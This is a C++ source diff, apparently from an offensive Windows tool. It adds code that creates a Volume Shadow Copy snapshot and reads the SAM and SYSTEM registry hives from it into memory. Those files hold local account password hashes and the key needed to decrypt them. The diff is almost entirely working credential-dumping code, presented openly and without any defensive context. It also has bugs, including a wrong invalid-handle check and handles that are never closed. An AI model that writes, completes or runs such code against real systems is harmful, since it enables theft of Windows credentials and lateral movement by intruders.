@@ -7,12 +7,28 @@
 // https://github.com/microsoft/Windows-classic-samples/blob/main/Samples/Win7Samples/winbase/vss/vshadow/shadow.cpp
 // https://github.com/PeterUpfold/ShadowDuplicator
 // https://learn.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-reference
+// 
+// Special mention to ShadowDuplicator from Peter Upfold because I took some much code from it to implement the shadow copy method and get SYSTEM and SAM from it
+// https://github.com/PeterUpfold
+// 
 //#define _CRT_SECURE_NO_WARNINGS
+
+#include <Windows.h>
+#include <vsbackup.h>
+#include <vss.h>
+#include <stdio.h>
 
 #include "shadowMethod.h"
 
 BOOL createSS() {
 	HRESULT result;
+	int strResult;
+	BOOL resultRead;
+	BYTE * SAM;
+	BYTE * SYSTEM;
+	DWORD numberBytesRead;
+	DWORD fileSize;
+	HANDLE file;
 	IVssBackupComponents * backupComponents = NULL;
 	IVssAsync * vssAsync = NULL;
 	HRESULT asyncResult = E_FAIL;
@@ -135,5 +151,32 @@ BOOL createSS() {
 
 	result = backupComponents->GetSnapshotProperties(*snapshotId, &snapshotProp);
 
-	// TO BE CONTINUED :)
+	// Perform the copy from SS
+
+	// Read SAM
+	WCHAR sourcePathFile[MAX_PATH];
+	strResult = swprintf(sourcePathFile, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, L"Windows\\System32\\Config\\SAM");
+	
+	file = CreateFileW(sourcePathFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, NULL, NULL);
+
+	if (file == NULL) {
+		exit(1);
+	}
+
+	fileSize = GetFileSize(file, NULL);
+	SAM = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
+	resultRead = ReadFile(file, SAM, fileSize, &numberBytesRead, NULL);
+
+	// Then SYSTEN
+	strResult = swprintf(sourcePathFile, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, L"Windows\\System32\\Config\\SYSTEM");
+
+	file = CreateFileW(sourcePathFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, NULL, NULL);
+
+	if (file == NULL) {
+		exit(1);
+	}
+
+	fileSize = GetFileSize(file, NULL);
+	SYSTEM = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
+	resultRead = ReadFile(file, SYSTEM, fileSize, &numberBytesRead, NULL);
 }
